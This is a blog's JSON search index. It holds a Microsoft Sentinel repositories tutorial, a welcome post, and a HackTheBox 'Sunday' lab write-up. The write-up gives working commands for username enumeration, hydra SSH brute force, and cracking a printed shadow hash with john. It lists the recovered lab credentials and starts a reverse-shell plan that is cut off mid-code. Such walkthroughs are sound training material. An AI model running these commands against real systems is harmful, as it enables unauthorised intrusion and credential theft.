[{"categories":null,"content":"Introduction It can be stressful managing multiple workspaces in Microsoft Sentinel, especially when it comes to having to manually deploy analytic rules in large enterprise environments with multiple tenants. This feature is incredibly useful for Managed Security Service Providers who manage multiple workspaces. With Microsoft Sentinel Repositories, we can deploy and manage custom content from a central repository across multiple workspaces at ease. Originally this article was written in early 2022 when Microsoft Sentinel Repositories was released. This feature is still in public preview and can be referenced here: https://learn.microsoft.com/en-us/azure/sentinel/ci-cd?tabs=github Prerequisites Sentinel supports connections to GitHub and Azure DevOps repositories. According to Microsoft the following permissions are required to connect a Microsoft Sentinel workspace to your source control repository: Resource Group Owner or both the User Access Administrator and Sentinel Contributer roles Contributer access to the code repository in GitHub or Azure DevOps Actions enabled for GitHub and Pipeliens enabled for Azure Devops ![image-20220927081028648](/Users/bfell/Library/Application Support/typora-user-images/image-20220927081028648.png) Pro tip: For the MSSPs and multi-tenant scenarios leveraging Azure Lighthouse, it’s recommended assigning these roles to a group in your ARM template prior to deploying Azure Lighthouse. The role definition ids can be found here: https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles ","date":"2022-09-27","objectID":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/:0:0","tags":null,"title":"Deploy Custom Content In Microsoft Sentinel Using Repositories","uri":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/"},{"categories":null,"content":"Additional Prerequisites Additionally, to deploy custom content it’s required to have Actions enabled for GitHub and Pipelines enabled for Azure DevOps. Although there is a plethora of .yml files in the Microsoft Sentinel Public GitHub Repository, custom content can only be deployed via Azure Resource Manager (ARM) templates. Pro tip: It is extremely useful to leverage a separate workspace as a model tenant to build, test, stage, and export custom content as ARM templates in Microsoft Sentinel. ![Untitled picture2](/Users/bfell/Desktop/crap/Untitled picture2.png) Deploying Content For the purpose of this demonstration we’ll be deploying Analytic Rules, but the following content types can be selected when creating a new connection in Repositories: Analytic Rules Automation Rules Hunting Queries Parsers Playbooks Workbooks ","date":"2022-09-27","objectID":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/:1:0","tags":null,"title":"Deploy Custom Content In Microsoft Sentinel Using Repositories","uri":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/"},{"categories":null,"content":"Creating Connections At the time of writing there were too many cross-tenant limitations which existed when connecting Azure DevOps so this demonstration was done using GitHub. If you decide to use Azure DevOps, please note that if you’re creating the connection as a guest user the AzureDevOps URL must be entered manually and will not appear in the dropdown. Be sure to be signed into either GitHub or Azure DevOps to connect a repository and in Microsoft Sentinel, under Content Management, select Repositories in the Sentinel workspace where you wish to deploy content. ![image-20220927080432943](/Users/bfell/Library/Application Support/typora-user-images/image-20220927080432943.png) Make sure you’re signed into the account which has been assigned the proper permissions, select “Add new”, and Create a new connection. Name the connection and if necessary provide a description, next authorize your Source control application. Once you’ve authorized either GitHub or AzureDevOps select a repository, branch, and select the Content types and hit create. ![image-20220927082536123](/Users/bfell/Library/Application Support/typora-user-images/image-20220927082536123.png) This connection will create a workflow rule in your source repository and begin to deploy or update any existing content specified in the rule. For the sake of this article, we’re going to add the rule after we connect the repository. ","date":"2022-09-27","objectID":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/:2:0","tags":null,"title":"Deploy Custom Content In Microsoft Sentinel Using Repositories","uri":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/"},{"categories":null,"content":"Example In the example below, we’ll deploy a really simple analytic rule in which detects for failed login activity in an Active Directory network. ![Untitled picture](/Users/bfell/Desktop/crap/Untitled picture.png) Since we can only deploy content through Azure Resource Manager (ARM) templates in the form of .json files, it is recommended to first create the rule in a separate workspace and export it. You can do this by selecting the analytic rule and selecting the export button at the top. Once you have the .json file ARM template, adding this rule to your source repository will immediately deploy to all of the connected workspaces. ![image-20220927084908815](/Users/bfell/Library/Application Support/typora-user-images/image-20220927084908815.png) Note that any changes to existing content will overwrite, any content matching the parameters to deploy will deploy to all workspaces connected to the workflow. ![image-20220927085306366](/Users/bfell/Library/Application Support/typora-user-images/image-20220927085306366.png) Pro tip: Making use of a naming convention to label your CICD content can be extremely helpful when managing content. When managing large rule sets with multiple workspaces, it’s recommended making the required updates and changes to rules from the central repository to maintain consistency across the connected workspaces. ","date":"2022-09-27","objectID":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/:3:0","tags":null,"title":"Deploy Custom Content In Microsoft Sentinel Using Repositories","uri":"/deploy-custom-content-in-microsoft-sentinel-using-repositories/"},{"categories":null,"content":" HackTheBox Write-Up: Sunday Sunday is no day off, it’s a great machine to practice common Linux privilege escalation methods through proper enumeration \u0026 vulnerability chaining. nmap -Pn -sS -p- 10.10.10.76 \u003e [OMITTED FOR BREVITY] \u003e ------------------------ \u003e PORT STATE SERVICE \u003e ------------------------ \u003e 79/tcp open finger \u003e 111/tcp open rpcbind \u003e 22022/tcp open unknown \u003e 34550/tcp open unknown \u003e 55407/tcp open unknown \u003e Nmap done: 1 IP address (1 host up) scanned in 2262.52 seconds There are five ports open, only one I am familiar with. nmap -A -p79,111,22022,34550,55407 10.10.10.76 \u003e Host is up (0.025s latency). \u003e PORT STATE SERVICE VERSION \u003e 79/tcp open finger Sun Solaris fingerd \u003e |\\_finger: No one logged on\\\\x0D \u003e 111/tcp open rpcbind 2-4 (RPC #100000) \u003e 22022/tcp open ssh SunSSH 1.3 (protocol 2.0)** \u003e | ssh-hostkey: \u003e | 1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA) \u003e |\\_ 1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA) \u003e 34550/tcp open unknown \u003e 55407/tcp open unknown** \u003e [OMITTED FOR BREVITY] \u003e Nmap done: 1 IP address (1 host up) scanned in 62.51 seconds A few Google searches finds me a vulnerability involving the Solaris implementation of fingerd allowing username enumeration. [https://www.rapid7.com/db/vulnerabilities/finger-solaris-user-enumeration] Some more searching leads me to a Perl script we can use to enumerate usernames. We’ll download it using wget. wget https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl # Usage: finger-user-enum.pl [options] # ( -u username | -U file-of-usernames ) # ( -t host | -T file-of-targets ) # Example: # finger-user-enum.pl -U users.txt -t 10.0.0.1 finger-user-enum.pl -u root -t 10.0.0.1 finger-user-enum.pl -U users.txt -T ips.txt A quick locate username on my Kali machine pulls all the files containing the word username. locate username /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt sounds good to me with an advertised 10 million usernames! Quick preview Using this file, our syntax in our working directory will be: perl finger-user-enum.pl -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.76 \u003e userenum.txt The scripts output will append the results to a file named userenum.txt. (You do not have to do this, I just donâ€™t like to lose my results.) The output is a bit messy, but we have a few usernames to attempt a brute-force attack against port [22022/tcp open ssh SunSSH 1.3 (protocol 2.0)] The following usernames are the most interesting: sammy@10.10.10.76: sammy console \u003cJul 31 17:59\u003e sunny@10.10.10.76: sunny pts/3 \u003cApr 24, 2018\u003e Use the following syntax to brute-force: hydra -V -f -t 4 -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022 We obtain the credentials for Sunny! sunny:sunday ssh -p 22022 sunny@10.10.10.76 Habitually on Linux systems itâ€™s always a good idea to check if a low-privileged user has any sudo permissions. sudo -l We find that we can run the command /root/troll as root without a password. While traversing and enumerating the files on the machine, I found a copy of the shadow file containing hashed user passwords. cat /backup/shadow.backup If we are able to crack Sammy’s password hash, we’ll be able to grab the user.txt flag. echo \"sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::\" \u003e hash.txt Copy the hash to a file, I named mine hash.txt. We’ll use john to crack the hash. john -w=\"/usr/share/wordlists/rockyou hash.txt Success. Sammy:cooldude! Let’s grab the user.txt found on the desktop, and enumerate the system using Sammy’s credentials. ssh -p 22022 sammy@10.10.10.76 Habitually, we type sudo -l. sudo -l Looks like Sammy can run wget as root without a password. With this, we can overwrite /root/troll with a reverse-shell and then run it as root with Sunny’s user account. Copy and paste this Python reverse-shell to a file named reverse.py on the target machine. #!/usr/bin/python import socket import subpro","date":"2022-09-27","objectID":"/sunday/:0:0","tags":null,"title":"HackTheBox Write-Up:  Sunday","uri":"/sunday/"},{"categories":null,"content":"Overview We’re thrilled to bring you an exciting blog which is jam packed of resources. ","date":"2022-09-24","objectID":"/welcome/:1:0","tags":null,"title":"Welcome!","uri":"/welcome/"}]